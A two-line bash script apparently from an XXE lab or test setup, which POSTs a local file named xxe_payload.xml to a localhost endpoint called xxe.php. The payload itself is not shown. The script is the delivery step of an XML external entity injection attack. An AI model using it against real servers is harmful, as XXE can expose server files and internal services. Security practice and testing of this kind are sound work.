#!/bin/bash
curl -X POST http://localhost/xxe.php -d "@xxe_payload.xml" -H "Content-Type: application/xml"
